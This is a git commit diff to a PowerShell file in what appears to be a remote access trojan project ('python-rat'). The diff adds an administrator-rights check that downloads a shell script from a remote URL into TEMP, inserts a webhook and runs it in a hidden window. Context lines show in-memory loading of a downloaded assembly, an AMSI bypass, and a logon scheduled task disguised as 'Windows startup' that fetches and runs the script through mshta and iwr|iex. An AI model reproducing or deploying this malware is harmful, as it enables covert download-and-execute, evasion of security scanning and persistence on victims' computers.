e9e4c622b72e231ff57e25b7448a1ee62a2def19
43a1723 <hai1723notgay@gmail.com>
2024-08-19 16:43:28 +0700

    Update main.ps1

--- rat-scr/main.ps1
+++ rat-scr/main.ps1
@@ -3,6 +3,12 @@ $bytes = (New-Object Net.WebClient).DownloadData($url)
 $assembly = [System.Reflection.Assembly]::Load($bytes)
 [Bypass]::amsi()
 
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+    Invoke-WebRequest "https://raw.githubusercontent.com/s1uiasdad/python-rat/main/rat-scr/shell/shell" -OutFile "$env:TEMP\shell.cmd"
+    (Get-Content "$env:TEMP\shell.cmd") -replace "%webhook%", $webhook | Set-Content "$env:TEMP\shell.cmd"
+    Start-Process "cmd.exe" -ArgumentList "/c $env:TEMP\shell.cmd" -WindowStyle Hidden
+}
+
 $task_name = "Windows startup"
 $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';iwr('https://raw.githubusercontent.com/s1uiasdad/python-rat/main/rat-scr/main.ps1')|iex`",0)(window.close)"
 $task_trigger = New-ScheduledTaskTrigger -AtLogOn
